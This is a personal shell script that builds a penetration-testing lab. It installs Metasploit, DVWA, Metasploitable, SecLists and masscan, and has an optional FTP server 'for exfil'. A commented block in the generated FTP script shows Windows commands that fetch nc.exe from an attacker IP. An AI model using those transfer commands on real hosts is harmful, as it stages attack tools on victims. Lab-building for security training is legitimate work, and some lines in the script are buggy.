#!/bin/sh
ftp=0

while [ "$1" != "" ]; do
    case $1 in 
        --ftp )     shift
                    ftp=1
                    ;;
    esac
done
red='\e[1;31m'
grn='\e[1;32m'
yel='\e[1;33m'
blu='\e[1;34m'
mag='\e[1;35m'
cyn='\e[1;36m'
wht='\e[1;97m'
gry='\e[1;37m'
lgrn='\e[1;92m'
end='\e[0m'

# ASCII art by http://patorjk.com/software/taag/#p=display&f=Graffiti&t=kali%0A
# can be added with figlet and the Graffiti font
cat << "EOF"
 _______          __  .___     ____   _________
 \      \   _____/  |_|   | ___\   \ /   /     \
 /   |   \_/ __ \   __\   |/    \   Y   /  \ /  \
/    |    \  ___/|  | |   |   |  \     /    Y    \
\____|__  /\___  >__| |___|___|  /\___/\____|__  /
        \/     \/              \/              \/
  ___________________________________ _____________
 /   _____/\_   _____/\__    ___/    |   \______   \
 \_____  \  |    __)_   |    |  |    |   /|     ___/
 /        \ |        \  |    |  |    |  / |    |
/_______  //_______  /  |____|  |______/  |____|
        \/         \/
EOF

host=`hostname`
if [ "$host" = "base" ]; then
    cat << "EOF"
___.                                                  __
\_ |__ _____    ______ ____     _________.__. _______/  |_  ____   _____
 | __ \\__  \  /  ___// __ \   /  ___<   |  |/  ___/\   __\/ __ \ /     \
 | \_\ \/ __ \_\___ \\  ___/   \___ \ \___  |\___ \  |  | \  ___/|  Y Y  \
 |___  (____  /____  >\___  > /____  >/ ____/____  > |__|  \___  >__|_|  /
     \/     \/     \/     \/       \/ \/         \/            \/      \/
EOF
elif [ "$host" = "exta" ]; then
cat << "EOF"
                 __
  ____ ___  ____/  |______
_/ __ \\  \/  /\   __\__  \
\  ___/ >    <  |  |  / __ \_
 \___  >__/\_ \ |__| (____  /
     \/      \/           \/

EOF

elif [ "$host" = "inta" ]; then
cat << "EOF"
.__        __
|__| _____/  |______
|  |/    \   __\__  \
|  |   |  \  |  / __ \_
|__|___|  /__| (____  /
        \/          \/
EOF

elif [ "$host" = "dmza" ]; then
cat << "EOF"
    .___
  __| _/_____ _____________
 / __ |/     \\___   /\__  \
/ /_/ |  Y Y  \/    /  / __ \_
\____ |__|_|  /_____ \(____  /
     \/     \/      \/     \/
EOF

elif [ "$host" = "dmzb" ]; then
cat << "EOF"
    .___             ___.
  __| _/_____ _______\_ |__
 / __ |/     \\___   /| __ \
/ /_/ |  Y Y  \/    / | \_\ \
\____ |__|_|  /_____ \|___  /
     \/     \/      \/    \/

     Make sure you update the sudoers file for me
     user1   ALL=(ALL:ALL) ALL
EOF
    if ! sudo apt-get -qq install git ; then
        sudo apt-get install git -y
    fi

    if ! sudo apt-get -qq install mysql-client ; then
        sudo apt-get install mysql-client mysql-server \
            php php-gd php-mysqli libapache2-mod-php -y
    fi

    if [ ! -d /var/www/html/dvwa ] ; then
        sudo git clone --recursive https://github.com/ethicalhack3r/DVWA.git /var/www/html/dvwa
    fi

fi

# echo $wht '[*] Check to see the last time apt-get update ran' $end
todaysdate=`date +%m%d`
aptdate=`date -r /var/lib/apt/periodic/update-stamp +%m%d`

if [ $todaysdate -eq $aptdate ] ; then
    echo $yel '[+] apt-get update already ran today' $end
else
    echo $gry '[ ] Running apt-get update to get things up to date' $end
    sudo apt-get update -y
fi
# echo $wht '[*] Check to see if Metasploit is installed' $end
if [ "$host" = "base" ] || [ "$host" = "exta" ]; then
    if ! which msfconsole > /dev/null; then
        echo $gry '[ ] metasploit not installed yet' $end
        echo [+] Downloading Metasploit
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
        chmod 755 msfinstall && \
        echo [+] Installing Metasploit
        ./msfinstall
    else
        echo $grn '[+] Metasploit is installed' $end
    fi

    # echo $wht '[*] Check if Tmux is installed' $end
    if ! which tmux > /dev/null; then
        echo [ ] tmux not installed
        echo [+] installing tmux
        sudo apt-get install tmux -y
    else
        echo $grn '[+] Tmux is already installed' $end
    fi

    # echo $wht '[*] Check if postgresql is installed' $end
    # if ! which postgresql > /dev/null; then
    if ! sudo apt-get -qq install postgresql-common ; then
        echo [ ] postgresql not installed
        echo [+] installing postgresql
        sudo apt-get install postgresql -y
    else
        echo $grn '[+] postgresql is already installed' $end
    fi

    if ! [ -d ~/.vim/bundle/vundle ]; then
        echo [ ] vundle not installed
        echo [+] installing vundle so you dont get errors in vim
        git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
    fi

# IF this is Kali then lets get it configured correctly
elif [ "$host" = "kali" ]; then
echo $red
cat << "EOF"
  ____  __.      .__  .__
 |    |/ _|____  |  | |__|
 |      < \__  \ |  | |  |
 |    |  \ / __ \|  |_|  |
 |____|__ (____  /____/__|
         \/    \/
EOF
echo $end
    if [ ! -d /etc/ssh/default_keys ]; then
        echo $grn [+]$end Backing up origional SSH keys
        cd /etc/ssh
        mkdir default_keys
        mv ssh_host* default_keys
        dpkg-reconfigure openssh-server
        md5sum ssh_host*
        md5sum default_keys/ssh_host*
    else
        echo $grn [+]$end SSH Keys previously backed up
        echo $wht '-------------------------------------------------------------' $end
        # cd /etc/ssh
        # (md5sum ssh_host*
        # md5sum default_keys/ssh_host*) | sort
        # echo $wht '-----------Default Keys Should Be Different----------' $end

        for FILE in $(cd /etc/ssh/ && ls ssh_host*)
        do
            if [ -f /etc/ssh/default_keys/${FILE} ]; then
                HASHDEFAULT=`md5sum /etc/ssh/default_keys/${FILE} | awk '{print $1}'`
                HASHNEW=`md5sum /etc/ssh/${FILE} | awk '{print $1}'`
                if [ ! "$HASHDEFAULT" = "$HASHNEW" ]; then
                    echo $grn [+]$end $HASHNEW $FILE
                else
                    echo $red [-] $HASHNEW  $FILE DEFAULT KEY$end
                fi
            fi
        done
        echo $wht '-------------------------------------------------------------' $end
    fi
    cd

echo $yel
cat << "EOF"
  __                .__           .__                 __         .__  .__
_/  |_  ____   ____ |  |   ______ |__| ____   _______/  |______  |  | |  |
\   __\/  _ \ /  _ \|  |  /  ___/ |  |/    \ /  ___/\   __\__  \ |  | |  |
 |  | (  <_> |  <_> )  |__\___ \  |  |   |  \\___ \  |  |  / __ \|  |_|  |__
 |__|  \____/ \____/|____/____  > |__|___|  /____  > |__| (____  /____/____/
                              \/          \/     \/            \/
EOF
echo $end
    # echo $wht '[*] Check if dotfiles have been pulled from git' $end
    # echo $wht '[*] Check for dotfiles directory' $end

    if [ ! -d /usr/share/seclists ] ; then
        echo $grn [+]$end Pulling danielmiessler seclists
        git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
    else
        echo $yel [*]$end danielmiessler seclists directory already exists
    fi


    if [ ! -d /opt/udp-proto-scanner ] ; then
        echo $grn [+]$end Pulling udp-proto-scanner
        git clone https://github.com/portcullislabs/udp-proto-scanner /opt/udp-proto-scanner
        ln -s /opt/udp-proto-scanner/udp-proto-scanner.pl /usr/local/bin/udp-proto-scanner
        ln -s /opt/udp-proto-scanner/udp-proto-scanner.conf /usr/local/bin/udp-proto-scanner.conf


        # cp udp-proto-scanner.pl udp-proto-scanner.conf /usr/local/bin/
    else
        echo $yel [*]$end udp-proto-scanner directory already exists
    fi

    if [ ! -d ~/dotfiles ] ; then
        echo $grn [+]$end Pulling dotfiles from github
        git clone https://www.github.com/octothorp88/dotfiles ~/dotfiles
    else
        echo $yel [*]$end dotfiles directory already exists
    fi

    if [ ! -L .bashrc ]; then
        echo $grn [+]$end linking .bashrc
            if [ -f ~/.bashrc ]; then mv ~/.bashrc ~/.bashrc_orig ; fi
        ln -s ./dotfiles/.bashrc ~/.bashrc
    fi


    if [ ! -L .vimrc ]; then
        echo $grn [+]$end linking .vimrc
        if [ -f ~/.vimrc ]; then
            mv ~/.vimrc ~/.vimrc_orig
        fi
        ln -s ./dotfiles/.vimrc .vimrc > /dev/null
    else
        echo $yel [*]$end .vimrc previously linked
    fi
    if [ ! -L .tmux.conf ] ; then
        echo $grn [+]$end Linking .tmux.conf
        ln -s ./dotfiles/tmux.conf .tmux.conf
    else
        echo $yel [*]$end .tmux.conf previously linked
    fi

    # if ! sudo apt-get -qq install  asciio; then
        # echo $yel [+]$end Installing asciio package
        # apt-get install asciio
    # fi

    if ! sudo apt-get -qq install mingw-w64; then
        echo $yel [+]$end Installing mingw-w64 complier for exploits
        apt-get install mingw-w64
    else
        echo $yel [*]$end mingw-w64 previously installed
    fi

    if ! sudo apt-get -qq install masscan; then
        echo $yel [+]$end Installing masscan port scanner
        apt-get install masscan
    else
        echo $yel [*]$end masscan previously installed
    fi

    if [ $ftp -eq 1 ] ; then
        echo $grn [+]$end Installing pure-ftpd for exfil

        if ! sudo apt-get -qq install pure-ftpd; then
            echo $yel [+]$end Installing pure-ftpd for exfil
            apt-get install pure-ftpd
        fi

echo $grn [+]$end creating pure-ftpd setup script
cat << "EOF" > ~/bin/setup-ftp.sh
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphomne
/etc/init.d/pureftpd restart


#############################################################################
# from within windows you could create a file to feed the ftp server
# echo open 10.11.0.5  21 > ftp.txt
# echo user offsec >> ftp.txt
# echo ftp >> ftp.txt
# echo bin >> ftp.txt
# echo GET nc.exe >> ftp.txt
# echo bye >> ftp.txt
# ftp -v -n -s:ftp.txt
#############################################################################

EOF
chmod 755 ~/bin/setup-ftp.sh
    fi

    if ! [ -d ~/.vim/bundle/vundle ]; then
	git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
    fi

    if [ ! -d ~/.ssh ]; then
        echo $wht [*]$end Checking for ~/.ssh directory
        mkdir ~/.ssh
        chmod 700 ~/.ssh
    fi

    if [ ! -f ~/.ssh/config ]; then
        echo $grn [*]$end Creating basic .ssh/config file for netivim
cat << "EOF" >> ~/.ssh/config
Host base
    HostName 172.16.80.146
    User user1
    IdentityFile ~/.ssh/id_rsa
    VisualHostKey=yes
Host dmza
    Hostname dmza
    User user1
    ProxyJump base
EOF
    fi

    if [ ! -f ~/bin/mount-vmware-shares.sh ]; then
	if [ ! -d ~/bin ]; then 
		mkdir ~/bin
	fi
    echo $grn [*]$end creating vmware share script
cat << "EOF" > ~/bin/mount-vmware-shares.sh
vmware-hgfsclient | while read folder; do
    echo "[+] Mounting ${folder} (/mnt/hgfs/${folder})"
    mkdir -p "/mnt/hgfs/${folder}"
    umount -f "/mnt/hgfs/${folder}" 2>/dev/null
    vmhgfs-fuse -o allow_other -o auto_unmount ".host:/${folder}" "/mnt/hgfs/${folder}"
done
EOF
chmod +x ~/bin/mount-vmware-shares.sh

fi

echo $yel
cat << "EOF"
 ________                    .___.__
 \______ \____________     __| _/|__| ______
  |    |  \_  __ \__  \   / __ | |  |/  ___/
  |    `   \  | \// __ \_/ /_/ | |  |\___ \
 /_______  /__|  (____  /\____ | |__/____  >
         \/           \/      \/         \/
EOF
echo $end
# Check if the dradis framework has been downloaded
    echo $grn [*]$end Checking Dradis templates
    if [ ! -f ~/Downloads/dradis-ce_compliance_package-oscp.v0.3.zip ]; then
        cd Downloads
        echo $grn [*]$end Dowloading Dradis OCSP templates for Dradis
        wget https://dradisframework.com/academy/files/dradis-ce_compliance_package-oscp.v0.3.zip
        cd
    else
        echo $yel [*]$end Dradis OCSP templates exists in downloads

    fi
    if [ ! -d ~/Downloads/dradis-ce_compliance_package-oscp.v0.3 ]; then
        cd ~/Downloads
        echo $grn [*]$end Unzipping dradis-ce_copliance_package-oscp.v03.zip
        unzip dradis-ce_compliance_package-oscp.v0.3.zip
        cd
    fi

    for TEMPLATE in evidence.txt note-tester.txt issue.txt note
    do
        if [ ! -f /var/lib/dradis/templates/notes/${TEMPLATE} ] ; then
            echo $grn [*]$end Adding Dradis OCSP ${TEMPLATE} templates to Dradis
            cp ~/Downloads/dradis-ce_compliance_package-oscp.v0.3/$TEMPLATE /var/lib/dradis/templates/notes
        else
            echo $yel "[*]${end} OCSP ${TEMPLATE} templates exists in Dradis"
        fi
    done
    if [ ! -f /var/lib/dradis/templates/reports/html_export/dradis_template-oscp.v0.3.html.erb ] ; then
        echo $grn [*]$end Updating Dradis Reporting templates
        cp ~/Downloads/dradis-ce_compliance_package-oscp.v0.3/dradis_template-oscp.v0.3.html.erb /var/lib/dradis/templates/reports/html_export/
    else
        echo $yel [*]$end Dradis Reporting template exists
    fi

fi

if [ ! -f ~/bin/dradis-reset.sh ]; then
    echo $grn [*]$end Creating dradis-reset.sh script in ~/bin
    mkdir -p ~/bin
cat << "EOF" > ~/bin/dradis-reset.sh
#!/bin/bash

cd /usr/lib/dradis/
echo $grn [*] $end Reset Dradis
bundle exec thor dradis:reset
echo $grn [*] $end Reset Dradis Attachments
bundle exec thor dradis:reset:attachments
echo $grn [*] $end Reset Dradis Database
bundle exec thor dradis:reset:database
echo $grn [*] $end Reset Dradis password
bundle exec thor dradis:reset:password
echo $grn [*] $end Reset Dradis again...
bundle exec thor dradis:reset
echo $grn [*] $end Launch Dradis
dradis

EOF
else
    echo $yel [*]$end Dradis-reset.sh script EXISTS

fi

#---------- Done with the OS conditional shit

# echo $wht '[*] Check to see if Metasploit is installed' $end
if [ "$host" = "base" ] || [ "$host" = "exta" ]; then
    if ! which msfconsole > /dev/null; then
        echo $gry '[ ] metasploit not installed yet' $end
        echo [+] Downloading Metasploit
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
        chmod 755 msfinstall && \
        echo [+] Installing Metasploit
        ./msfinstall
    else
        echo $grn '[+] Metasploit is installed' $end
    fi

    # echo $wht '[*] Check if Tmux is installed' $end
    if ! which tmux > /dev/null; then
        echo [ ] tmux not installed
        echo [+] installing tmux
        sudo apt-get install tmux -y
    else
        echo $grn '[+] Tmux is already installed' $end
    fi

    # echo $wht '[*] Check if postgresql is installed' $end
    # if ! which postgresql > /dev/null; then
    if ! sudo apt-get -qq install postgresql-common ; then
        echo [ ] postgresql not installed
        echo [+] installing postgresql
        sudo apt-get install postgresql -y
    else
        echo $grn '[+] postgresql is already installed' $end
    fi

    if ! sudo apt-get -qq install htop ; then
        echo [ ] htop not installed
        echo [+] installing htop
        sudo apt-get install htop -y
    else
        echo $grn '[+] htop is already installed' $end
    fi

    # echo $wht '[*] Check if GIT is installed' $end
    if ! which git > /dev/null; then
        echo '[+] installing git'
        sudo apt-get install git -y
    else
        echo $grn '[+] git already installed' $end
    fi

    # echo $wht '[*] Check if VIM is installed' $end
    if ! which vim > /dev/null; then
        echo [+] installing vim
        sudo apt-get install vim -y
    else
        echo $grn '[+] vim already installed' $grn
    fi

    # echo $wht '[*] Check if dotfiles have been pulled from git' $end
    # echo $wht '[*] Check for dotfiles directory' $end
    if [ ! -d ~/dotfiles ] ; then
        echo $grn [+]$end Pulling dotfiles from github
        git clone https://www.github.com/octothorp88/dotfiles ~/dotfiles
    else
        echo $grn [+]$end dotfiles directory already exists
    fi
    # echo $wht '[*] Check if dotfiles are linked' $end
    if [ ! -L .vimrc ]; then
        echo $grn '[+] linking .vimrc' $grn
        ln -s ./dotfiles/.vimrc .vimrc > /dev/null
    else
        echo $grn '[*] .vimrc previously linked' $grn
    fi
    if [ ! -L .tmux.conf ] ; then
        echo $grn '[+] Linking .tmux.conf' $grn
        ln -s ./dotfiles/tmux.conf .tmux.conf
    else
        echo $grn '[*] .tmux.conf previously linked' $grn
    fi

    # echo $wht '[*] Check if Vundel Is installed' $end
    if [ ! -d ~/.vim/bundle/vundle ] ; then
        echo $wht '[ ] installig vim plugin manager' $end
        git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
    else
        echo $grn '[*] vim vundle installed - make sure your run BundleInstall in vim' $grn
    fi
fi

if [ "$host" = "base" ]; then
    # echo $wht '[*] Checking for metasploitable download' $end
    if [ ! -f ./metasploitable-linux-2.0.0.zip ] ; then
        echo $gry '[ ] downloading metasploitable from rapid7'
        wget http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip
    else
        echo $grn '[+] metasploitable downloaded and exists' $end
    fi
    metasploitable2=2ae8788e95273eee87bd379a250d86ec52f286fa7fe84773a3a8f6524085a1ff

    echo     $mag '    KNOWN HASH:'$metasploitable2 $end
    download=`sha256sum ./metasploitable-linux-2.0.0.zip | awk '{print $1}'`
    if [ "$metasploitable2" = "$download" ]; then
        echo $mag'     LOCAL HASH:'$download $end
        echo $grn '[+] metasploitable hash verification PASSED' $end
        if [ ! -f Metasploitable2-Linux/Metasploitable.vmdk ]; then
            unzip ./metasploitable-linux-2.0.0.zip
        else
            echo $grn '[+] Metasploitable2 unzipped' $end
            if [ ! -f Metasploitable2-Linux/Metasploitable2.qcow2 ]; then
                echo $grn '[+] Converting metasploitable to qcow2 format' $end
                qemu-img convert -f vmdk -O qcow2 Metasploitable2-Linux/Metasploitable.vmdk Metasploitable2-Linux/Metasploitable2.qcow2
            else
                echo $grn '[+] Metasploitable previously converted to qcow2 format' $end
            fi
        fi
    else
        echo $red'     LOCAL HASH:'$download $end
        echo $red '[-] metasploitable hash verification FAILED' $end
    fi

    # echo $wht '[*] Checking for Kali Light  download' $end
    if [ ! -f ./kali-linux-light-2019.1-amd64.iso ] ; then
        echo [ ] downloading kali from kali.org
        wget http://cdimage.kali.org/kali-2019.1/kali-linux-light-2019.1-amd64.iso
    else
        echo $grn '[+] kali light downloaded and exists'
    fi

    kalilight=5e9fe4b6f099c3a0062dd21b68c61ea328fc145d60536d8f20f1ab27ad21b856
    echo $mag'     KNOWN HASH:'$kalilight $end
    download=`sha256sum ./kali-linux-light-2019.1-amd64.iso| awk '{print $1}'`
    if [ "$kalilight" = "$download" ]; then
        echo $mag'     LOCAL HASH:'$download $end
        echo $grn '[+] kali hash verification PASSED' $end
    else
        echo $red'     LOCAL HASH:'$download $end
        echo $red '[-] kali hash verification FAILED' $end
    fi

    # echo $wht '\n[*] Checking for Kali full download' $end
    if [ ! -f ./kali-linux-2019.1-vm-amd64.7z ] ; then
        echo $wht '[ ] downloading kali from kali.org' $end
        wget https://images.offensive-security.com/virtual-images/kali-linux-2019.1-vm-amd64.7z
    else
        echo $grn '[+] kali full downloaded and exists' $end
    fi


    kalifull=e4c6999edccf27f97d4d014cdc66950b8b4148948abe8bb3a2c30bbc0915e95a
    echo $mag'     KNOWN HASH:'$kalifull $end
    download=`sha256sum ./kali-linux-2019.1-vm-amd64.7z | awk '{print $1}'`
    if [ $kalifull = $download ]; then
        echo $mag'     LOCAL HASH:'$download $end
        echo $grn '[+] kali hash verification PASSED' $end
        if [ ! -f Kali-Linux-2019.1-vm-amd64/Kali-Linux-2019.1-vm-amd64.vmdk ]; then
            7z x ./kali-linux-2019.1-vm-amd64.7z
        else
            echo $grn '[+] Kali Full VM previously unzipped' $end
        fi

        if [ ! -f Kali-Linux-2019.1-vm-amd64/Kali-Linux-2019.1-vm-amd64.qcow2 ]; then
            echo $grn '[+] Converting Kali full to qcow2 format' $end
            qemu-img convert -f vmdk -O qcow2 Kali-Linux-2019.1-vm-amd64/Kali-Linux-2019.1-vm-amd64.vmdk Kali-Linux-2019.1-vm-amd64/Kali-Linux-2019.1-vm-amd64.qcow2 
        else
            echo $grn '[+] Kali Full previously converted to qcow2 format' $end
        fi
    else
        echo $red'     LOCAL HASH:'$download $end
        echo $red '[-] kali hash verification FAILED' $end
    fi

    if [ ! -f ~/.ssh/id_rsa ] ; then
        echo $wht '[ ] creating SSH keypair' $end
        ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096
    else
        echo $grn '[ ] SSH keypair already present' $end
    fi

    echo $wht '[ ] Copy SSH keys to hosts' $end
    if [ -f ~/.ssh/id_rsa ] ; then
        for vm in dmza inta exta dmzf; do
            if !  virsh start $vm 2>&1 | grep 'already active' > /dev/null; then
                echo $yel '[+] waiting for VM to spin up' $end
                sleep 10
            else
                echo $grn '[+] VM is already running' $vm  $end
            fi
            ssh-copy-id -i ~/.ssh/id_rsa.pub user1@${vm}
        done
    else
        echo $red '[-] missing ~/.ssh/id_rsa' $end
    fi

    echo $wht '[ ] stage files to other hosts and install' $end
    for vm in dmza inta exta; do
        if ssh ${vm} stat ./msfinstall \> /dev/null 2\>\&1; then
            echo $grn '[+] msfinstall exists on ' ${vm}  $end
        else
            echo $grn '[+] copying msfinstall on ' ${vm}  $end
            scp ./msfinstall ${vm}:./
        fi
        if ssh ${vm} stat ./netinvm-initialize.sh \> /dev/null 2\>\&1; then
            echo $grn '[+] netinvm-initialize.sh exists on ' ${vm}  $end
        else
            echo $grn '[+] copying netinvm-intialize.sh on ' ${vm}  $end
            scp ./netinvm-initialize.sh ${vm}:./
        fi
    done
fi
#!/bin/bash

